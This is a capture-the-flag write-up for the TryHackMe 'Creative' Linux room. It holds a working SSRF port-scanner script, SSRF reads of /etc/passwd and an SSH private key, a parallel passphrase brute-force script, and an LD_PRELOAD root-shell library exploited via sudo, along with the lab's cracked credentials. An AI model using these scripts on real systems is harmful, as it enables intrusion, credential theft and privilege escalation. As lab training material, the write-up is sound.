---
tags:
  - THM
  - Linux
  - Easy
  - SSRF
  - Scripting
  - LFI
  - Brute-Force
  - Leakage
  - Sudo
  - Lib-HJ
---
https://tryhackme.com/room/creative/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.162.167 creative.thm beta.creative.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC creative.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
Found [Beta URL Tester website](http://beta.creative.thm/) at subdomain `beta.creative.thm`, which allows to test a URL to see if it is alive and display its content. So, I created a Python script `scan.py` to list **internal open ports**:
```python
import requests
import threading

URL = "http://beta.creative.thm"
HEADERS = {
    "Host": "beta.creative.thm",
    "Content-Type": "application/x-www-form-urlencoded"
}

MAX_THREADS = 100

def scan_port(port: int):
    try:
        payload = f"url=http://localhost:{port}"
        response = requests.post(URL, payload, headers=HEADERS, timeout=2)
        content_length = response.headers.get('Content-Length')

        if content_length != '13':
            print(f"[+] Found open port: {port}")
    except:
        pass
    
    semaphore.release()

semaphore = threading.Semaphore(MAX_THREADS)
threads = []

for port in range(1, 65536):
    semaphore.acquire()
    t = threading.Thread(target=scan_port, args=(port,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
```
Found **internal port 1337**:
```console
$ python3 scan.py

[+] Found open port: 80
[+] Found open port: 1337
```
Created function to control web requests:
```bash
ssrf() {
    curl -s -X POST -H 'Host: beta.creative.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d "url=$1" 'http://beta.creative.thm'
}
```
Found Python file server listing root directory:
```console
$ ssrf 'http://localhost:1337/' | html2text --ignore-links -d

# Directory listing for /

* * *

  - bin@
  - boot/
  - dev/
  - etc/
  - home/
  - lib@
  - lib32@
  - lib64@
  - libx32@
  - lost+found/
  - media/
  - mnt/
  - opt/
  - proc/
  - root/
  - run/
  - sbin@
  - snap/
  - srv/
  - swap.img
  - sys/
  - tmp/
  - usr/
  - var/

* * *
```
# Exploitation
## File Inclusion
Found **user saad**:
```console
$ ssrf 'http://localhost:1337/etc/passwd' | grep sh$

root:x:0:0:root:/root:/bin/bash
saad:x:1000:1000:saad:/home/saad:/bin/bash
```
Get SSH private key from **user saad**:
```console
$ ssrf 'http://localhost:1337/home/saad/.ssh/id_rsa' > id_rsa
```
Private key is protected with a **passphrase**:
```console
$ ssh -i ./id_rsa saad@creative.thm

Enter passphrase for key 'id_rsa':
```
## Cracking Passphrase
Created Bash script `brute_force.sh` to find the **passphrase**:
```bash
#!/bin/bash

key_file='./id_rsa'
dict_file='/usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt'
max_jobs=8

pass_file=$(mktemp)
job_count=0

while read -r passphrase; do
    # Try passphrase in background
    (
        if ssh-keygen -y -f "$key_file" -P "$passphrase" &>/dev/null; then
            echo "[+] Found passphrase: $passphrase" > "$pass_file"
            exit 0
        fi
    ) &
    
    # Limit maximum number of jobs
    job_count=$((job_count+1))
    if [ "$job_count" -ge "$max_jobs" ]; then
        wait -n # Wait for any job to finish
        job_count=$((job_count-1))
        # Kill all jobs if passphrase is found
        if [ -s "$pass_file" ]; then
            cat "$pass_file"
            rm -f "$pass_file"
            kill $(jobs -p) 2>/dev/null
            exit 0
        fi
    fi
done < "$dict_file"

wait # Wait for all jobs to end
if [ -s "$pass_file" ]; then
    cat "$pass_file"
else
    echo "[-] Passphrase not found in wordlist"
fi

rm -f "$pass_file"
```
Cracked the **passphrase**:
```console
$ chmod +x brute_force.sh

$ ./brute_force.sh
[+] Found passphrase: sweetness
```
Log in via SSH using the **passphrase**:
```console
$ ssh -i ./id_rsa saad@creative.thm

Enter passphrase for key 'id_rsa': sweetness
```
Read the **user flag**:
```bash
cat /home/saad/user.txt
```
# Post-Exploitation
Found **sudo password**:
```console
$ cat /home/saad/.bash_history

whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
sudo -l
```
Pre-loading **shared libraries (LD_PRELOAD)** and `ping`command are allowed by `sudo`:
```console
$ sudo -l

Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```
Created malicious **shared library** `shell.c` to spawn a **root shell**:
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```
Compile it at `/tmp/shell.so`:
```bash
gcc -fPIC -nostartfiles -shared -o /tmp/shell.so ./shell.c
```
Load the **shared library**:
```console
$ sudo LD_PRELOAD=/tmp/shell.so ping

# whoami
root
```
Read the **root flag**:
```bash
cat /root/root.txt
```
# Notes
- In many write-ups, people crack the SSH private key **passphrase** using `ssh2john`, `john` and `hashcat`, but I was not able to do it due to errors and lack of maintenance.